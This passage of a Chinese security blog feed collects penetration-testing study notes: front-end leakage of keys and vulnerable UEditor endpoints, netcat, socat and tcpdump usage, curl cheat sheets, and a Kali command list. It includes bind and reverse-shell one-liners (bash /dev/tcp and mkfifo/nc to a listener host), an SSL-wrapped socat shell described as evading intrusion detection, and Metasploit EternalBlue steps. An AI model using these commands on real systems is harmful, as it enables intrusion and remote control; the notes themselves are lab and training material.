各功能模块的接口</li><li>Assets - 静态资源文件</li><li>Common - 公共资源文件</li><li><strong><em>Entity</em></strong> - 实例<ul><li>危险点：各类配置文件、各类配置秘钥</li></ul></li><li><strong><em>Router</em></strong> - 功能路由<ul><li>Path - 功能路径</li><li>Name - 功能描述<br>示例：<a href="https://xxx.com/#/login">https://xxx.com/#/login</a></li></ul></li><li><strong><em>Store</em></strong> - 软件开发工具包</li><li><strong><em>Utils</em></strong> - 引用、依赖</li><li>Views - 前端视图文件</li></ul></li></ul></li></ul></li><li><p>总结</p><ul><li>存在 Webpack，在未登录的情况下，<br>依旧可以获得完整的配置信息、接口信息</li><li>存在接口信息、参数、配置文件、注释信息、第三方组件、测试账户<br>等信息泄露</li><li>可利用泄露的前端代码进行 Web 应用的还原</li></ul></li></ul><hr><h4 id="Source-Map"><a href="#Source-Map" class="headerlink" title="Source Map"></a>Source Map</h4><ul><li>未发现 Webpack 之后，也尝试寻找 Source Map<br>其特征：app.xxx.js、vender.xxx.js、chunk.xxx.js</li></ul><blockquote><p><em>案例 1</em></p></blockquote><ul><li><p>在某 JavaScript 文件的注释中发现了 Source Map 地址</p></li><li><p>对 JavaScript 文件添加.map 后缀后访问</p></li><li><p>内容近乎等同于 Webpack</p></li><li><p>相关工具 ：**<em>restore-source-map</em>**</p><ul><li>安装方法</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/laysent/restore-source-map</span><br><span class="line">cd restore-source-map</span><br><span class="line">sudo npm install -g</span><br></pre></td></tr></table></figure><hr><h4 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h4><ul><li>在 Webpack、Source Map 均无的情况下，也可以查看 JavaScript 文件</li></ul><blockquote><p><em>隐藏在 JS 中的各种环境信息</em></p></blockquote><ul><li>Username、password - 测试用户密码</li><li>baseURL - 相关链接信息</li><li>Api - 接口服务器信息</li><li>Config - 配置信息</li><li>Env - 环境信息</li></ul><blockquote><p><em>开发平台密钥 id&#x2F;secret</em></p></blockquote><ul><li>app_id 是应用的唯一识别，可以在开发者后台的凭证与基础信息中查看</li><li>app_secret 是应用的密钥，可以在开发者后台的凭证与基础信息中查看或重置<ul><li>案例：通过前端信息泄露，获取微信公众号的密钥对</li></ul></li></ul><blockquote><p><em>云存储的密钥 ak&#x2F;sk</em></p></blockquote><ul><li>与开发者密钥类似，一般为 accessKeyId、accessKeySecret<ul><li>可使用 oss 浏览器，利用凭证登录</li></ul></li></ul><blockquote><p>泄露 Author 署名信息</p></blockquote><ul><li>可进行信息搜集，搜索引擎信息泄露，GitHub 信息泄露等进一步利用</li></ul><blockquote><p>内部 IP 地址、测试 IP 地址泄露</p></blockquote><blockquote><p>手机号码、身份证号码、银行卡号泄露</p></blockquote><h5 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞"></a>编辑器漏洞</h5><ul><li>前端文件中出现类似于 ueditor.config.js 此类编辑器的配置文件，<br>说明 Web 应用使用了特定的编辑器，可能存在通用漏洞</li><li>Ueditor 编辑器漏洞<ul><li>上传文件导致存储类 XSS 漏洞：&#x2F;ueditor&#x2F;jsp&#x2F;controller.jsp?action&#x3D;uploadfile</li><li>反射型 XSS 漏洞：&#x2F;ueditor&#x2F;jsp&#x2F;getContent.jsp?myEditor&#x3D;</li><li>抓取图片处存在 SSRF 漏洞：&#x2F;ueditor&#x2F;jsp&#x2F;controller.jsp?action&#x3D;catchimage</li><li>未授权遍历上传文件信息漏洞：&#x2F;ueditor&#x2F;jsp&#x2F;controller.jsp?action&#x3D;listfile</li><li>.net 版本可通过远程服务器 getshell：<br>&#x2F;ueditor&#x2F;net&#x2F;controller.ashx?action&#x3D;catchimage</li></ul></li></ul><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong><em>总结</em></strong></h1><ul><li>高风险 - Webpack 存在，可直接分析各种前端文件中的内容</li><li>中风险 - Source Map 存在，可尝试还原 Source Map 文件</li><li>低风险 - 以上均无时，查看 JavaScript 文件</li></ul><hr>]]></content>
      
      
      
        <tags>
            
            <tag> WEB安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali-Linux常用网络工具</title>
      <link href="/2023/10/20/Kali-Linux%E5%B8%B8%E7%94%A8%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7/"/>
      <url>/2023/10/20/Kali-Linux%E5%B8%B8%E7%94%A8%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="netcat-一般使用"><a href="#netcat-一般使用" class="headerlink" title="netcat 一般使用"></a><code>netcat</code> 一般使用</h1><blockquote><p>netcat 原始网络渗透测试工具之一。常用于使用 TCP 或者 UDP 协议通过网络连接读写数据。</p></blockquote><hr><table><thead><tr><th align="center">参数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">-n</td><td align="center">禁用 dns 解析服务</td></tr><tr><td align="center">-v</td><td align="center">显示详细信息</td></tr><tr><td align="center">-e</td><td align="center">连接 shell 时必须要使用到的</td></tr><tr><td align="center">-l</td><td align="center">listen 监听</td></tr><tr><td align="center">-p</td><td align="center">指定监听端口</td></tr></tbody></table><h2 id="netcat-探测服务器-TCP-端口是否开放"><a href="#netcat-探测服务器-TCP-端口是否开放" class="headerlink" title="netcat 探测服务器 TCP 端口是否开放"></a>netcat 探测服务器 TCP 端口是否开放</h2><blockquote><p><code>nc -v &lt;remote-server-ip or remote-server-domain&gt;:port</code></p></blockquote><p>例如:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nc -v ql.nowuo.cn 443</span><br><span class="line"></span><br><span class="line">DNS fwd/rev mismatch: ql.nowuo.cn != localhost</span><br><span class="line">ql.nowuo.cn [121.5.90.198] 443 (https) open</span><br></pre></td></tr></table></figure><blockquote><p>如上方的 <code>nc -v ql.nowuo.cn 443</code> 探测网站<code>ql.nowuo.cn</code>上的服务器 443 端口为开放状态。</p></blockquote><h2 id="netcat-文件传输"><a href="#netcat-文件传输" class="headerlink" title="netcat 文件传输"></a>netcat 文件传输</h2><p>创建 netcat 服务端：<code>nc -nvlp 443 &lt; filename</code></p><p>netcat 客户端连接: <code>nc -nv 127.0.0.1:443 &gt; filename</code></p><h2 id="netcat-连接-shell"><a href="#netcat-连接-shell" class="headerlink" title="netcat 连接 shell"></a>netcat 连接 shell</h2><h3 id="netcat-正向-shell"><a href="#netcat-正向-shell" class="headerlink" title="netcat 正向 shell"></a>netcat 正向 shell</h3><p>创建 netcat 服务端：<code>nc -nvlp 443 -e /bin/zsh</code></p><p>netcat 客户端连接: <code>nc -nv 127.0.0.1:443</code></p><h3 id="netcat-反向-shell"><a href="#netcat-反向-shell" class="headerlink" title="netcat 反向 shell"></a>netcat 反向 shell</h3><p>创建 netcat 服务端：<code>nc -nvlp 443</code></p><p>netcat 客户端连接: <code>nc -nv 127.0.0.1:443 -e /bin/zsh</code></p><h1 id="socat-一般使用"><a href="#socat-一般使用" class="headerlink" title="socat 一般使用"></a><code>socat</code> 一般使用</h1><hr><blockquote><p><code>socat</code> 和 <code>netcat</code> 的功能大同小异</p></blockquote><p>socat 服务端创建: <code>socat TCP4-LISTEN:port STDOUT</code></p><p>socat 客户端连接: <code>socat - TCP4:&lt;remote-server-ip&gt;:port</code></p><h2 id="socat-文件传输"><a href="#socat-文件传输" class="headerlink" title="socat 文件传输"></a>socat 文件传输</h2><p>socat 服务端创建: <code>socat TCP4-LISTEN:port,fork file:&lt;filename&gt;</code></p><p>socat 客户端连接: <code>socat - TCP4:&lt;remote-server-ip&gt;:port file:&lt;filaname&gt;,create</code></p><h2 id="socat-绑定-shell"><a href="#socat-绑定-shell" class="headerlink" title="socat 绑定 shell"></a>socat 绑定 shell</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">socat 服务端</span></span><br><span class="line">socat TCP4-LISTEN:443,fork EXEC:/bin/zsh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">socat 客户端</span></span><br><span class="line">socat - TCP4:126.0.0.1:443</span><br></pre></td></tr></table></figure><h2 id="socat-绑定反向-shell"><a href="#socat-绑定反向-shell" class="headerlink" title="socat 绑定反向 shell"></a>socat 绑定反向 shell</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">socat 服务端</span></span><br><span class="line">socat -d -d TCP4-LISTEN:443 STDOUT</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">socat 客户端</span></span><br><span class="line">socat TCP4:126.0.0.1:443,fork EXEC:/bin/zsh</span><br></pre></td></tr></table></figure><h2 id="socat-绑定加密-shell"><a href="#socat-绑定加密-shell" class="headerlink" title="socat 绑定加密 shell"></a>socat 绑定加密 shell</h2><blockquote><p>给绑定 shell 添加加密功能，我们将依靠安全套接层（SSL）证书。这种级别的加密将有助于规避入侵检测系统（IDS）并帮助隐藏我们传输的敏感数据。</p></blockquote><p>openssl 常用参数</p><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>req</td><td>发起一个新的证书签名请求（Certificate Signing Request）</td></tr><tr><td>-newkey</td><td>生成一个新的私钥</td></tr><tr><td>rsa:2048</td><td>使用 RSA 加密算法，密钥长度为 2,048 位</td></tr><tr><td>-nodes</td><td>在存储私钥时不使用密码保护</td></tr><tr><td>-keyout</td><td>将私钥保存到指定文件中</td></tr><tr><td>-x509</td><td>输出一个自签名证书而不是证书请求</td></tr><tr><td>-days</td><td>设置证书的有效期（以天为单位）</td></tr><tr><td>-out</td><td>将生成的证书保存到指定文件中</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用openssl来生成密钥</span></span><br><span class="line">openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days</span><br><span class="line">362 -out bind_shell.crt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将bind_shell.key 和 bind_shell.crt 合并为 .pem格式(socat支持的格式)。</span></span><br><span class="line">cat bind_shell.key bind_shell.crt &gt; bind_shell.pem</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">我们使用OPENSLL协议来创建一个socat监听器, cert 用来指出证书。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">verify=0 设置禁用SSL验证, 并为监听器建立连接后派出一个子进程。用来连接shell。</span></span><br><span class="line">sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork</span><br><span class="line">EXEC:/bin/bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">客户端连接</span></span><br><span class="line">sudo socat - OPENSLL:127.0.0.1,verify=0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">反向shell</span></span><br><span class="line">sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">客户端连接</span></span><br><span class="line">sudo socat - OPENSLL:127.0.0.1,verify=0,fork EXEC:/bin/zsh</span><br></pre></td></tr></table></figure><h1 id="tcpdump-命令详解"><a href="#tcpdump-命令详解" class="headerlink" title="tcpdump 命令详解"></a><code>tcpdump</code> 命令详解</h1><hr><blockquote><p><code>tcpdump</code> 是一个用于捕获网络数据包的命令行工具。它能够监听网络接口，捕获经过该接口的数据包，并对其进行分析和展示。</p></blockquote><blockquote><p>以下是 <code>tcpdump</code> 命令的常用参数和用法：</p></blockquote><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>-i &lt;接口&gt;</code></td><td>指定要监听的网络接口。</td></tr><tr><td><code>-n</code></td><td>以数字形式显示主机地址和端口号。</td></tr><tr><td><code>-c &lt;数量&gt;</code></td><td>仅捕获指定数量的数据包后停止。</td></tr><tr><td><code>-s &lt;长度&gt;</code></td><td>设置捕获数据包时的最大长度。</td></tr><tr><td><code>-w &lt;文件&gt;</code></td><td>将捕获的数据包保存到指定的文件中。</td></tr><tr><td><code>-X</code></td><td>以 HEX 和 ASCII 格式化打印数据包</td></tr></tbody></table><blockquote><p>实际上，使用”-n”选项是一种常见的使用 tcpdump 的技巧，它可以跳过将 IP 地址解析为主机名的步骤，以提高 tcpdump 的性能。在网络数据包分析过程中，DNS 名称解析可能会引入一些延迟，特别是在大量数据包的情况下。因此，使用”-n”选项可以使 tcpdump 直接显示 IP 地址，而无需进行 DNS 解析。</p></blockquote><blockquote><p>以下是 <code>tcpdump</code> 命令的一些示例用法：</p></blockquote><table><thead><tr><th>用法</th><th>描述</th></tr></thead><tbody><tr><td><code>tcpdump -i eth0</code></td><td>监听网络接口 <code>eth0</code> 上的数据包。</td></tr><tr><td><code>tcpdump -n</code></td><td>不把网络地址转换成名字，即不做反向域名解析</td></tr><tr><td><code>tcpdump -c 10</code></td><td>仅捕获前 10 个数据包后停止。</td></tr><tr><td><code>tcpdump -s 100</code></td><td>设置捕获的数据包最大长度为 100 个字节。</td></tr><tr><td><code>tcpdump -w capture.pcap</code></td><td>将捕获的数据包保存到 <code>capture.pcap</code> 文件中。</td></tr><tr><td><code>cpdump -nX -r &lt;文件名&gt;</code></td><td>以 ASCII 格式显示捕获数据包文件中数据包</td></tr><tr><td><code>cpdump -nA -r &lt;文件名&gt;</code></td><td>以 HEX 格式显示捕获数据包文件中数据包</td></tr><tr><td><code>tcpdump -A -n &#39;tcp[13] = 24&#39; -r &lt;文件名&gt;</code></td><td>以 HEX 格式显示捕获数据包文件中包含<code>ACK</code>  和 <code>PSH</code> 标志的数据包（高级表头过滤）</td></tr></tbody></table><blockquote><p>TCP 数据包格式</p></blockquote><p><img src="/statics/img/md_img/tcp.png" alt="TCP_head"></p><blockquote><p>使用 <code>tcpdump</code> 命令时，可以根据需要选择适当的参数和示例用法。希望这个表格能够帮助你更好地理解和记录 <code>tcpdump</code> 命令的常用参数和用法！如果有任何问题，请随时提问。</p></blockquote><blockquote><p><code>echo &quot;$((2#00011000))&quot;</code> 将<code>2</code> 进制数 <code>0001100</code>转化为<code>10</code>进制数并打印。</p></blockquote><p>TCP 标志位</p><blockquote><p>在使用 <code>tcpdump</code> 命令时，<code>tcpflags</code> 是一个常用的选项，用于指定要匹配的 TCP 标志位组合。它用于基于标志位的值过滤 TCP 数据包。下面是常用的标志位组合的表格：</p></blockquote><table><thead><tr><th>标志位组合</th><th>描述</th></tr></thead><tbody><tr><td>SYN</td><td>匹配设置了 SYN 标志位的数据包（TCP 连接建立）</td></tr><tr><td>ACK</td><td>匹配设置了 ACK 标志位的数据包（TCP 确认）</td></tr><tr><td>FIN</td><td>匹配设置了 FIN 标志位的数据包（TCP 连接终止）</td></tr><tr><td>RST</td><td>匹配设置了 RST 标志位的数据包（TCP 连接重置）</td></tr><tr><td>URG</td><td>匹配设置了 URG 标志位的数据包（紧急数据）</td></tr><tr><td>PSH</td><td>匹配设置了 PSH 标志位的数据包（TCP 推送数据）</td></tr><tr><td>SYN-ACK</td><td>匹配同时设置了 SYN 和 ACK 标志位的数据包（TCP 连接建立的确认）</td></tr><tr><td>FIN-ACK</td><td>匹配同时设置了 FIN 和 ACK 标志位的数据包（TCP 连接终止的确认）</td></tr><tr><td>ALL</td><td>匹配所有数据包，不管 TCP 标志位的设置</td></tr></tbody></table><blockquote><p>你可以使用这些标志位组合和 <code>tcpdump</code> 中的 <code>tcpflags</code> 选项来根据特定的标志位设置过滤和分析 TCP 流量。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">基本格式</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印TCP标志位同时设置了RST和ACK的数据包。（即只选择标志字段中同时设置了RST和ACK的标志，如果结果是<span class="string">&quot;RST and ACK both set&quot;</span>，则匹配）</span></span><br><span class="line">tcpdump &#x27;tcp[tcpflags] &amp; (tcp-rst|tcp-ack) == (tcp-rst|tcp-ack)&#x27;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> OSCP学习 </tag>
            
            <tag> Kali Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Curl的使用</title>
      <link href="/2023/10/20/Curl%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2023/10/20/Curl%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="cURL"><a href="#cURL" class="headerlink" title="cURL"></a>cURL</h2><table><thead><tr><th><strong>Command</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>curl -h</code></td><td>cURL help menu</td></tr><tr><td><code>curl inlanefreight.com</code></td><td>Basic GET request</td></tr><tr><td><code>curl -s -O inlanefreight.com/index.html</code></td><td>Download file</td></tr><tr><td><code>curl -k https://inlanefreight.com</code></td><td>Skip HTTPS (SSL) certificate validation</td></tr><tr><td><code>curl inlanefreight.com -v</code></td><td>Print full HTTP request&#x2F;response details</td></tr><tr><td><code>curl -I https://www.inlanefreight.com</code></td><td>Send HEAD request (only prints response headers)</td></tr><tr><td><code>curl -i https://www.inlanefreight.com</code></td><td>Print response headers and response body</td></tr><tr><td><code>curl https://www.inlanefreight.com -A &#39;Mozilla/5.0&#39;</code></td><td>Set User-Agent header</td></tr><tr><td><code>curl -u admin:admin http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code></td><td>Set HTTP basic authorization credentials</td></tr><tr><td><code>curl  http://admin:admin@&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code></td><td>Pass HTTP basic authorization credentials in the URL</td></tr><tr><td><code>curl -H &#39;Authorization: Basic YWRtaW46YWRtaW4=&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code></td><td>Set request header</td></tr><tr><td><code>curl &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/search.php?search=le&#39;</code></td><td>Pass GET parameters</td></tr><tr><td><code>curl -X POST -d &#39;username=admin&amp;password=admin&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code></td><td>Send POST request with POST data</td></tr><tr><td><code>curl -b &#39;PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code></td><td>Set request cookies</td></tr><tr><td><code>curl -X POST -d &#39;&#123;&quot;search&quot;:&quot;london&quot;&#125;&#39; -H &#39;Content-Type: application/json&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/search.php</code></td><td>Send POST request with JSON data</td></tr></tbody></table><h2 id="APIs"><a href="#APIs" class="headerlink" title="APIs"></a>APIs</h2><table><thead><tr><th><strong>Command</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>curl http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/london</code></td><td>Read entry</td></tr><tr><td><code>curl -s http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/ | jq</code></td><td>Read all entries</td></tr><tr><td><code>curl -X POST http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/ -d &#39;&#123;&quot;city_name&quot;:&quot;HTB_City&quot;, &quot;country_name&quot;:&quot;HTB&quot;&#125;&#39; -H &#39;Content-Type: application/json&#39;</code></td><td>Create (add) entry</td></tr><tr><td><code>curl -X PUT http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/london -d &#39;&#123;&quot;city_name&quot;:&quot;New_HTB_City&quot;, &quot;country_name&quot;:&quot;HTB&quot;&#125;&#39; -H &#39;Content-Type: application/json&#39;</code></td><td>Update (modify) entry</td></tr><tr><td><code>curl -X DELETE http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/New_HTB_City</code></td><td>Delete entry</td></tr></tbody></table><h2 id="Browser-DevTools"><a href="#Browser-DevTools" class="headerlink" title="Browser DevTools"></a>Browser DevTools</h2><table><thead><tr><th><strong>Shortcut</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td>[<code>CTRL+SHIFT+I</code>] or [<code>F12</code>]</td><td>Show devtools</td></tr><tr><td>[<code>CTRL+SHIFT+E</code>]</td><td>Show Network tab</td></tr><tr><td>[<code>CTRL+SHIFT+K</code>]</td><td>Show Console tab</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> Kali Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript反混淆</title>
      <link href="/2023/10/20/JavaScript%E5%8F%8D%E6%B7%B7%E6%B7%86/"/>
      <url>/2023/10/20/JavaScript%E5%8F%8D%E6%B7%B7%E6%B7%86/</url>
      
        <content type="html"><![CDATA[<h1 id="Commands"><a href="#Commands" class="headerlink" title="Commands"></a>Commands</h1><table><thead><tr><th><strong>Command</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>curl http:/SERVER_IP:PORT/</code></td><td>cURL GET request</td></tr><tr><td><code>curl -s http:/SERVER_IP:PORT/ -X POST</code></td><td>cURL POST request</td></tr><tr><td><code>curl -s http:/SERVER_IP:PORT/ -X POST -d &quot;param1=sample&quot;</code></td><td>cURL POST request with data</td></tr><tr><td><code>echo hackthebox | base64</code></td><td>base64 encode</td></tr><tr><td><code>echo ENCODED_B64 | base64 -d</code></td><td>base64 decode</td></tr><tr><td><code>echo hackthebox | xxd -p</code></td><td>hex encode</td></tr><tr><td><code>echo ENCODED_HEX | xxd -p -r</code></td><td>hex decode</td></tr><tr><td><code>echo hackthebox | tr &#39;A-Za-z&#39; &#39;N-ZA-Mn-za-m&#39;</code></td><td>rot13 encode</td></tr><tr><td><code>echo ENCODED_ROT13 | tr &#39;A-Za-z&#39; &#39;N-ZA-Mn-za-m&#39;</code></td><td>rot13 decode</td></tr></tbody></table><h1 id="Deobfuscation-Websites"><a href="#Deobfuscation-Websites" class="headerlink" title="Deobfuscation Websites"></a>Deobfuscation Websites</h1><table><thead><tr><th><strong>Website</strong></th></tr></thead><tbody><tr><td><a href="https://jsconsole.com/">JS Console</a></td></tr><tr><td><a href="https://prettier.io/playground/">Prettier</a></td></tr><tr><td><a href="https://beautifier.io/">Beautifier</a></td></tr><tr><td><a href="http://www.jsnice.org/">JSNice</a></td></tr></tbody></table><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><table><thead><tr><th><strong>Command</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>ctrl+u</code></td><td>Show HTML source code in Firefox</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> WEB安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali Linux常用命令</title>
      <link href="/2023/10/20/Kali-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/10/20/Kali-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="Basic-Tools"><a href="#Basic-Tools" class="headerlink" title="Basic Tools"></a>Basic Tools</h2><table><thead><tr><th><strong>Command</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><strong>General</strong></td><td></td></tr><tr><td><code>sudo openvpn user.ovpn</code></td><td>Connect to VPN</td></tr><tr><td><code>ifconfig</code>&#x2F;<code>ip a</code></td><td>Show our IP address</td></tr><tr><td><code>netstat -rn</code></td><td>Show networks accessible via the VPN</td></tr><tr><td><code>ssh user@10.10.10.10</code></td><td>SSH to a remote server</td></tr><tr><td><code>ftp 10.129.42.253</code></td><td>FTP to a remote server</td></tr><tr><td><strong>tmux</strong></td><td></td></tr><tr><td><code>tmux</code></td><td>Start tmux</td></tr><tr><td><code>ctrl+b</code></td><td>tmux: default prefix</td></tr><tr><td><code>prefix c</code></td><td>tmux: new window</td></tr><tr><td><code>prefix 1</code></td><td>tmux: switch to window (<code>1</code>)</td></tr><tr><td><code>prefix shift+%</code></td><td>tmux: split pane vertically</td></tr><tr><td><code>prefix shift+&quot;</code></td><td>tmux: split pane horizontally</td></tr><tr><td><code>prefix -&gt;</code></td><td>tmux: switch to the right pane</td></tr><tr><td><strong>Vim</strong></td><td></td></tr><tr><td><code>vim file</code></td><td>vim: open <code>file</code> with vim</td></tr><tr><td><code>esc+i</code></td><td>vim: enter <code>insert</code> mode</td></tr><tr><td><code>esc</code></td><td>vim: back to <code>normal</code> mode</td></tr><tr><td><code>x</code></td><td>vim: Cut character</td></tr><tr><td><code>dw</code></td><td>vim: Cut word</td></tr><tr><td><code>dd</code></td><td>vim: Cut full line</td></tr><tr><td><code>yw</code></td><td>vim: Copy word</td></tr><tr><td><code>yy</code></td><td>vim: Copy full line</td></tr><tr><td><code>p</code></td><td>vim: Paste</td></tr><tr><td><code>:1</code></td><td>vim: Go to line number 1.</td></tr><tr><td><code>:w</code></td><td>vim: Write the file ‘i.e. save’</td></tr><tr><td><code>:q</code></td><td>vim: Quit</td></tr><tr><td><code>:q!</code></td><td>vim: Quit without saving</td></tr><tr><td><code>:wq</code></td><td>vim: Write and quit</td></tr></tbody></table><h2 id="Pentesting"><a href="#Pentesting" class="headerlink" title="Pentesting"></a>Pentesting</h2><table><thead><tr><th><strong>Command</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><strong>Service Scanning</strong></td><td></td></tr><tr><td><code>nmap 10.129.42.253</code></td><td>Run nmap on an IP</td></tr><tr><td><code>nmap -sV -sC -p- 10.129.42.253</code></td><td>Run an nmap script scan on an IP</td></tr><tr><td><code>locate scripts/citrix</code></td><td>List various available nmap scripts</td></tr><tr><td><code>nmap --script smb-os-discovery.nse -p445 10.10.10.40</code></td><td>Run an nmap script on an IP</td></tr><tr><td><code>netcat 10.10.10.10 22</code></td><td>Grab banner of an open port</td></tr><tr><td><code>smbclient -N -L \\\\10.129.42.253</code></td><td>List SMB Shares</td></tr><tr><td><code>smbclient \\\\10.129.42.253\\users</code></td><td>Connect to an SMB share</td></tr><tr><td><code>snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0</code></td><td>Scan SNMP on an IP</td></tr><tr><td><code>onesixtyone -c dict.txt 10.129.42.254</code></td><td>Brute force SNMP secret string</td></tr><tr><td><strong>Web Enumeration</strong></td><td></td></tr><tr><td><code>gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt</code></td><td>Run a directory scan on a website</td></tr><tr><td><code>gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt</code></td><td>Run a sub-domain scan on a website</td></tr><tr><td><code>curl -IL https://www.inlanefreight.com</code></td><td>Grab website banner</td></tr><tr><td><code>whatweb 10.10.10.121</code></td><td>List details about the webserver&#x2F;certificates</td></tr><tr><td><code>curl 10.10.10.121/robots.txt</code></td><td>List potential directories in <code>robots.txt</code></td></tr><tr><td><code>ctrl+U</code></td><td>View page source (in Firefox)</td></tr><tr><td><strong>Public Exploits</strong></td><td></td></tr><tr><td><code>searchsploit openssh 7.2</code></td><td>Search for public exploits for a web application</td></tr><tr><td><code>msfconsole</code></td><td>MSF: Start the Metasploit Framework</td></tr><tr><td><code>search exploit eternalblue</code></td><td>MSF: Search for public exploits in MSF</td></tr><tr><td><code>use exploit/windows/smb/ms17_010_psexec</code></td><td>MSF: Start using an MSF module</td></tr><tr><td><code>show options</code></td><td>MSF: Show required options for an MSF module</td></tr><tr><td><code>set RHOSTS 10.10.10.40</code></td><td>MSF: Set a value for an MSF module option</td></tr><tr><td><code>check</code></td><td>MSF: Test if the target server is vulnerable</td></tr><tr><td><code>exploit</code></td><td>MSF: Run the exploit on the target server is vulnerable</td></tr><tr><td><strong>Using Shells</strong></td><td></td></tr><tr><td><code>nc -lvnp 1234</code></td><td>Start a <code>nc</code> listener on a local port</td></tr><tr><td><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1&#39;</code></td><td>Send a reverse shell from the remote server</td></tr><tr><td><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 1234 &gt;/tmp/f</code></td><td>Another command to send a reverse shell from the remote server</td></tr><tr><td><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc -lvp 